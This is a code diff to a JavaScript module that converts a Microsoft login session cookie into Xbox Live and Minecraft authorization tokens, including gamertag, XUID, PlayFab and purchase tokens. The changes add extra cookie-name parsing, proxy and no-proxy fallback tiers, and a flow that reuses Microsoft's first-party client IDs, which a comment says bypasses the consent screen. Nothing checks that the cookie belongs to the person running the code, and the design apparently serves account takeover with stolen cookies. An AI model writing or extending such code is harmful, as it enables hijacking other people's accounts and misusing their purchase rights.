@@ -53,6 +53,10 @@ function extractAuthToken(input) {
             token = token.substring('__Host-MSAAUTH='.length);
         } else if (token.startsWith('__Host-MSAAUTHP=')) {
             token = token.substring('__Host-MSAAUTHP='.length);
+        } else if (token.startsWith('msauth=')) {
+            token = token.substring('msauth='.length);
+        } else if (token.startsWith('MSAAUTH=')) {
+            token = token.substring('MSAAUTH='.length);
         }
         token = token.split(';')[0].trim();
         return token || null;
@@ -166,8 +170,9 @@ function extractAndParseTokenFromText(text) {
  */
 async function sisuFlow(token, noProxy = false) {
     const httpClient = new HttpClient(!noProxy);
-    // Seed the cookie jar with the auth token
+    // Seed the cookie jar with the auth token (support both MSAAUTH and MSAAUTHP for OTP sessions)
     httpClient.setCookie(`__Host-MSAAUTH=${token}; Domain=.live.com; Path=/`);
+    httpClient.setCookie(`__Host-MSAAUTHP=${token}; Domain=.live.com; Path=/`);
 
     let currentUrl = 'https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId=8058f65d-ce06-4c30-9559-473c9275a65d&tid=896928775&ru=https://www.minecraft.net/en-us/login&aid=1142970254';
     const maxHops = 8;
@@ -263,7 +268,8 @@ async function sisuFlow(token, noProxy = false) {
 async function ppftPostFlow(token) {
     const httpClient = new HttpClient();
     httpClient.setCookie(`__Host-MSAAUTH=${token}; Domain=.live.com; Path=/`);
-    const cookieHeader = `__Host-MSAAUTH=${token}`;
+    httpClient.setCookie(`__Host-MSAAUTHP=${token}; Domain=.live.com; Path=/`);
+    const cookieHeader = `__Host-MSAAUTHP=${token}; __Host-MSAAUTH=${token}`;
     const loginRes = await httpClient.get('https://login.live.com/login.srf', {
         headers: {
             'Cookie': cookieHeader,
@@ -420,56 +426,94 @@ async function msalXboxLiveFlow(token, noProxy = false) {
     if (!rpsAccessToken) return null;
     const rpsTicket = `d=${rpsAccessToken}`;
 
-    // 4. Authenticate with user.auth.xboxlive.com
-    const userAuthRes = await httpClient.post(
-        'https://user.auth.xboxlive.com/user/authenticate',
-        {
-            Properties: {
-                AuthMethod: 'RPS',
-                RpsTicket: rpsTicket,
-                SiteName: 'user.auth.xboxlive.com'
+    return await authenticateXboxAndXsts(httpClient, rpsTicket);
+}
+
+/**
+ * Universal Xbox Live User Authentication and XSTS Token Authorization Helper
+ * Safely handles RPS exchange, XSTS relying party authorization, and captures Gamertag & XUID.
+ */
+async function authenticateXboxAndXsts(httpClient, rpsTicket) {
+    if (!rpsTicket) return null;
+
+    let userAuthRes;
+    try {
+        userAuthRes = await httpClient.post(
+            'https://user.auth.xboxlive.com/user/authenticate',
+            {
+                Properties: {
+                    AuthMethod: 'RPS',
+                    RpsTicket: rpsTicket.startsWith('d=') || rpsTicket.startsWith('t=') ? rpsTicket : `d=${rpsTicket}`,
+                    SiteName: 'user.auth.xboxlive.com'
+                },
+                RelyingParty: 'http://auth.xboxlive.com',
+                TokenType: 'JWT'
             },
-            RelyingParty: 'http://auth.xboxlive.com',
-            TokenType: 'JWT'
-        },
-        {
-            headers: { 
-                'Content-Type': 'application/json', 
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-                'Accept': 'application/json',
-                'x-xbl-contract-version': '1'
+            {
+                headers: { 
+                    'Content-Type': 'application/json', 
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+                    'Accept': 'application/json',
+                    'x-xbl-contract-version': '1'
+                },
+                timeout: 10000,
+                validateStatus: (s) => s >= 200 && s < 500
+            }
+        );
+    } catch (e) {
+        console.log('[XBL] user.auth.xboxlive.com network error:', e.message);
+        return null;
+    }
+
+    const userToken = userAuthRes?.data?.Token;
+    const uhsPrimary = userAuthRes?.data?.DisplayClaims?.xui?.[0]?.uhs;
+    if (!userToken) {
+        console.log('[XBL] user.auth.xboxlive.com failed to issue UserToken (status: ' + userAuthRes?.status + ')');
+        return null;
+    }
+
+    // Authorize Minecraft XSTS Token
+    let mcXstsRes;
+    try {
+        mcXstsRes = await httpClient.post(
+            'https://xsts.auth.xboxlive.com/xsts/authorize',
+            {
+                Properties: { SandboxId: 'RETAIL', UserTokens: [userToken] },
+                RelyingParty: 'rp://api.minecraftservices.com/',
+                TokenType: 'JWT'
             },
-            timeout: 10000
+            {
+                headers: { 
+                    'Content-Type': 'application/json', 
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+                    'Accept': 'application/json',
+                    'x-xbl-contract-version': '1'
+                },
+                timeout: 10000,
+                validateStatus: (s) => s >= 200 && s < 500
+            }
+        );
+    } catch (e) {
+        console.log('[XBL] Minecraft XSTS authorize network error:', e.message);
+        return null;
+    }
+
+    if (mcXstsRes?.status === 401) {
+        const xerr = mcXstsRes.data?.XErr;
+        console.log(`[XBL] Minecraft XSTS returned 401 with XErr: ${xerr}`);
+        if (xerr === 2148916238) {
+            console.log('[XBL] Diagnostic: Account is a child account or needs family organizer setup');
+        } else if (xerr === 2148916233) {
+            console.log('[XBL] Diagnostic: Account does not have an Xbox Live profile created');
+        } else if (xerr === 2148916235) {
+            console.log('[XBL] Diagnostic: Xbox Live not supported in country/region');
         }
-    );
+    }
 
-    const userToken = userAuthRes.data?.Token;
-    if (!userToken) return null;
+    const xstsToken = mcXstsRes?.data?.Token;
+    const uhs = mcXstsRes?.data?.DisplayClaims?.xui?.[0]?.uhs || uhsPrimary;
 
-    // 5. Authorize Minecraft XSTS Token
-    const mcXstsRes = await httpClient.post(
-        'https://xsts.auth.xboxlive.com/xsts/authorize',
-        {
-            Properties: { SandboxId: 'RETAIL', UserTokens: [userToken] },
-            RelyingParty: 'rp://api.minecraftservices.com/',
-            TokenType: 'JWT'
-        },
-        {
-            headers: { 
-                'Content-Type': 'application/json', 
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-                'Accept': 'application/json',
-                'x-xbl-contract-version': '1'
-            },
-            timeout: 10000
-        }
-    );
-
-    const xstsToken = mcXstsRes.data?.Token;
-    const uhs = mcXstsRes.data?.DisplayClaims?.xui?.[0]?.uhs;
-    if (!xstsToken || !uhs) return null;
-
-    // 6. Authorize Xbox Live profile token for Gamertag & XUID
+    // Authorize Xbox Live profile token for Gamertag & XUID
     let gtg = null;
     let xuid = null;
     try {
@@ -487,15 +531,16 @@ async function msalXboxLiveFlow(token, noProxy = false) {
                     'Accept': 'application/json',
                     'x-xbl-contract-version': '1'
                 },
-                timeout: 8000
+                timeout: 8000,
+                validateStatus: (s) => s >= 200 && s < 500
             }
         );
-        const xui = xboxXstsRes.data?.DisplayClaims?.xui?.[0];
+        const xui = xboxXstsRes?.data?.DisplayClaims?.xui?.[0];
         gtg = xui?.gtg || null;
         xuid = xui?.xid || null;
     } catch {}
 
-    // 7. Authorize PlayFab token
+    // Authorize PlayFab token
     let playfabxbl = null;
     try {
         const playfabRes = await httpClient.post(
@@ -506,20 +551,16 @@ async function msalXboxLiveFlow(token, noProxy = false) {
                 TokenType: 'JWT'
             },
             {
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-                    'Accept': 'application/json',
-                    'x-xbl-contract-version': '1'
-                },
-                timeout: 8000
+                headers: { 'Content-Type': 'application/json', 'x-xbl-contract-version': '1' },
+                timeout: 8000,
+                validateStatus: (s) => s >= 200 && s < 500
             }
         );
-        const secondtoken = playfabRes.data?.Token;
-        if (secondtoken) playfabxbl = `XBL3.0 x=${uhs};${secondtoken}`;
+        const secondtoken = playfabRes?.data?.Token;
+        if (secondtoken && uhs) playfabxbl = `XBL3.0 x=${uhs};${secondtoken}`;
     } catch {}
 
-    // 8. Authorize Purchase token
+    // Authorize Purchase token
     let purchasetoken = null;
     try {
         const purchaseRes = await httpClient.post(
@@ -530,27 +571,75 @@ async function msalXboxLiveFlow(token, noProxy = false) {
                 TokenType: 'JWT'
             },
             {
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
-                    'Accept': 'application/json',
-                    'x-xbl-contract-version': '1'
-                },
-                timeout: 8000
+                headers: { 'Content-Type': 'application/json', 'x-xbl-contract-version': '1' },
+                timeout: 8000,
+                validateStatus: (s) => s >= 200 && s < 500
             }
         );
-        const thirdtoken = purchaseRes.data?.Token;
-        if (thirdtoken) purchasetoken = `XBL3.0 x=${uhs};${thirdtoken}`;
+        const thirdtoken = purchaseRes?.data?.Token;
+        if (thirdtoken && uhs) purchasetoken = `XBL3.0 x=${uhs};${thirdtoken}`;
     } catch {}
 
-    return {
-        XBL: `XBL3.0 x=${uhs};${xstsToken}`,
-        gtg: gtg,
-        xuid: xuid,
-        playxbl: playfabxbl,
-        purchasingtoken: purchasetoken,
-        uhs: uhs
-    };
+    if (xstsToken && uhs) {
+        return {
+            XBL: `XBL3.0 x=${uhs};${xstsToken}`,
+            gtg: gtg,
+            xuid: xuid,
+            playxbl: playfabxbl,
+            purchasingtoken: purchasetoken,
+            uhs: uhs
+        };
+    }
+
+    return null;
+}
+
+/**
+ * Direct First-Party Minecraft/Xbox OAuth flow using official first-party client IDs
+ * (Bypasses consent screen requirement by requesting desktop service ticket directly)
+ */
+async function firstPartyRpsFlow(token, noProxy = false) {
+    const httpClient = new HttpClient(!noProxy);
+    httpClient.setCookie(`__Host-MSAAUTH=${token}; Domain=.live.com; Path=/`);
+    httpClient.setCookie(`__Host-MSAAUTHP=${token}; Domain=.live.com; Path=/`);
+    const cookieHeader = `__Host-MSAAUTHP=${token}; __Host-MSAAUTH=${token}`;
+
+    const clientConfigs = [
+        { id: '000000004C12AE6F', redirect: 'https://login.live.com/oauth20_desktop.srf', scope: 'service::user.auth.xboxlive.com::MBI_SSL' },
+        { id: '00000000402b5328', redirect: 'https://login.live.com/oauth20_desktop.srf', scope: 'service::user.auth.xboxlive.com::MBI_SSL' }
+    ];
+
+    for (const conf of clientConfigs) {
+        try {
+            const authRes = await httpClient.get('https://login.live.com/oauth20_authorize.srf', {
+                params: {
+                    client_id: conf.id,
+                    redirect_uri: conf.redirect,
+                    response_type: 'token',
+                    scope: conf.scope
+                },
+                headers: {
+                    'Cookie': cookieHeader,
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                },
+                maxRedirects: 0,
+                timeout: 10000,
+                validateStatus: (s) => s >= 200 && s < 400
+            });
+
+            const location = authRes.headers?.location || '';
+            const fragment = location.includes('#') ? location.split('#')[1] : (location.includes('?') ? location.split('?')[1] : '');
+            const params = new URLSearchParams(fragment);
+            const accessToken = params.get('access_token');
+            if (accessToken) {
+                const rpsTicket = `t=${accessToken}`;
+                const result = await authenticateXboxAndXsts(httpClient, rpsTicket);
+                if (result && result.XBL) return result;
+            }
+        } catch (_) {}
+    }
+
+    return null;
 }
 
 /**
@@ -586,6 +675,17 @@ module.exports = async (loginCookie) => {
             }
         } catch (err) {
             console.log('[XBL] Tier 2 PPFT failed:', err.message);
+        }
+
+        console.log('[XBL] Attempting Tier 2.5 (First Party Minecraft RPS Flow)...');
+        try {
+            const res25 = await firstPartyRpsFlow(token);
+            if (res25 && res25.XBL) {
+                console.log('[XBL] Tier 2.5 First Party RPS success!');
+                return res25;
+            }
+        } catch (err) {
+            console.log('[XBL] Tier 2.5 First Party RPS failed:', err.message);
         }
 
         console.log('[XBL] Attempting Tier 3 (Direct MSAL/Xbox Live OAuth Flow)...');
@@ -628,6 +728,17 @@ module.exports = async (loginCookie) => {
             }
         } catch (err) {
             console.log('[XBL] Tier 5 MSAL NO PROXY failed:', err.message);
+        }
+
+        console.log('[XBL] Attempting Tier 5.5 (First Party RPS Flow - NO PROXY)...');
+        try {
+            const res55 = await firstPartyRpsFlow(token, true);
+            if (res55 && res55.XBL) {
+                console.log('[XBL] Tier 5.5 First Party RPS NO PROXY success!');
+                return res55;
+            }
+        } catch (err) {
+            console.log('[XBL] Tier 5.5 First Party RPS NO PROXY failed:', err.message);
         }
 
         console.log('[XBL] Attempting Tier 6 (Direct SISU Flow - NO PROXY)...');
